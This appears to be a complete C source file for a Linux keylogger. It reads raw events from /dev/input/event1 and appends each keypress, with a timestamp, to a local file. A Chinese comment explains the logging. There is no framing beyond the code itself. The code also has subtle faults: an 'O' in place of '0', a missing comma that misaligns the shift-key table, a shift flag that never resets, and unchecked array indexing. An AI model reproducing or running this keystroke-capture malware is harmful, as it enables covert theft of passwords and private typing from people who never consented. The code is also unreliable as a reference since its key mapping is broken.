#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#define UK "[Unknown]"
static char *scancode_to_ascii[] = {
UK,"[Esc]",
"1","2","3","4","5","6","7","8","9","O", "-", "=","[Backspace]", "[Tab]",
"q" , "w" , "e" , "r", "t","y","u","i","o","p","[", "]", "[Enter]","[LCtrl]","a", "s" , "d", "f","g", "h","j","k","l","; ","'", "`", "[Lshift] ",
" \\ ", "z","x","c","v","b", "n","m", ",", ".", "/","[Rshift]",
"[NL*]",
"[LAlt]", " ", "[CapsLock]",
"[F1] ","[F2]","[F3] ","[F4]","[F5]","[F6] ","[F7]","[F8] ","[F9]","[F10]","[NumLock]","[ScrollLock]",
"[NL7]","[NL8]","[NL9]","[NL-] ",
"[NL4]","[NL5]","[NL6] ","[NL+] ",
"[NL1] ","[NL2]","[NL3]","[NL0]","[NL. ] ",
UK,UK,UK,
"[F11]","[F12]",
UK,UK,UK,UK,UK,UK,UK,
"[NLEnter] ","[RCtrl]","[NL/]"," [SysRq] ", "[RAlt]",UK,
"[Home] ","[Up] ","[PageUp] ","[Left] ","[Right] ","[End]" ,"[Down]" ,"[PageDown]", "[Insert]", "[Delete]"
};

static char *shift_scancode_to_ascii[] = {
UK,"[Esc] ",
" ! ", "@","#","$","%%","^","&","*","(",")","_","+","[Backspace]", "[Tab]",
"Q","W","E","R","T","Y","U","I","O","P","{","}"
"[Enter]", "[Lctrl]",
"A", "S","D","F","G","H","J","K","L",":","\"", "~", "[Lshift]",
"|","Z","X","C","V","B","N","M","<",">","?","[RShift]",
"[NL*]",
"[LAlt]", " ", " [CapsLock] ",
"[F1]","[F2]","[F3]","[F4]","[F5]","[F6] ","[F7]","[F8] ","[F9] ","[F10]","[NumLock]"," [ScrollLock]",
"[NL7] ","[NL8]","[NL9]","[NL-] ",
"[NL4] ","[NL5]","[NL6]","[NL+] ",
"[NL1] ","[NL2] ","[NL3]","[NL0] ","[NL.] ",
UK,UK,UK,
"[F11]","[F12]",
UK,UK,UK,UK,UK,UK,UK,
"[NLEnter] ","[RCtrl]","[NL/]","[SysRq] ","[RAlt]",UK,
"[Home]", "[Up]","[PageUp]","[Left] ","[Right] "," [End]" ,"[Down]"," [PageDown]", " [Insert]", "[Delete]"
};

static char *caps_scancode_to_ascii[] ={
    UK, "[Esc]",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[Backspace]", "[Tab]",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "[Enter]", "[LCtrl]", 
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "[Lshift]",
    "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "[RShift]",
    "[NL*]",
    "[LAlt]", " ", "[CapsLock]",
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[NumLock]", "[ScrollLock]",
    "[NL7]", "[NL8]", "[NL9]", "[NL-]",
    "[NL4]", "[NL5]", "[NL6]", "[NL+]",
    "[NL1]", "[NL2]", "[NL3]", "[NL0]", "[NL.]",
    UK, UK, UK,
    "[F11]", "[F12]",
    UK, UK, UK, UK, UK, UK, UK,
    "[NLEnter]", "[RCtrl]", "[NL/]", "[SysRq]", "[RAlt]", UK,
    "[Home]", "[Up]", "[PageUp]", "[Left]", "[Right]", "[End]", "[Down]", "[PageDown]", "[Insert]", "[Delete]"
};

int main() {
    FILE *fh = fopen("1.txt", "a+");
    int shift_pressed = 0;
    int caps_pressed = 0;
    int fd;
    fd = open("/dev/input/event1", O_RDONLY);
    struct input_event ev;
    while (1) {
        read(fd, &ev, sizeof(struct input_event));
        if (ev.type == 1) {
            if (ev.value == 1) { // Pressed a key
            	time_t current_time;
                char* c_time_string;
                current_time = time(NULL);
                c_time_string = ctime(&current_time);
                fprintf(fh, "%s: ", c_time_string);
                if (ev.code == 58) { // capslock = 58
                    if (caps_pressed) {
                        caps_pressed = 0;
                    } else {
                        caps_pressed = 1;
                    }
                }
                if (ev.code == 42 || ev.code == 54) { // LShift = 42，RShift = 54
                    shift_pressed = 1;
                }
                /*                
这段代码是根据不同的按键事件情况，将相应的键盘符号信息写入文件中。具体来说：

- 如果Shift键被按下，那么通过`shift_scancode_to_ascii`数组找到对应的键盘符号，然后将该键盘符号信息写入文件中。
- 如果Caps Lock键被按下，那么通过`caps_scancode_to_ascii`数组找到对应的键盘符号，然后将该键盘符号信息写入文件中。
- 如果既没有按下Shift键也没有按下Caps Lock键，那么通过`scancode_to_ascii`数组找到对应的键盘符号，然后将该键盘符号信息写入文件中。

每次写入文件后，使用`fflush`函数刷新文件缓冲区，确保内容被及时写入文件。*/
                if (shift_pressed) {
                    fprintf(fh, "Key %s pressed.\n", shift_scancode_to_ascii[ev.code]);
                    fflush(fh);
                } else if (caps_pressed) {
                    fprintf(fh, "Key %s pressed.\n", caps_scancode_to_ascii[ev.code]);
                    fflush(fh);
                } else {
                    fprintf(fh, "Key %s pressed.\n", scancode_to_ascii[ev.code]);
                    fflush(fh);
                }
            }
        }
    }
    fclose(fh);
    return 0;
}
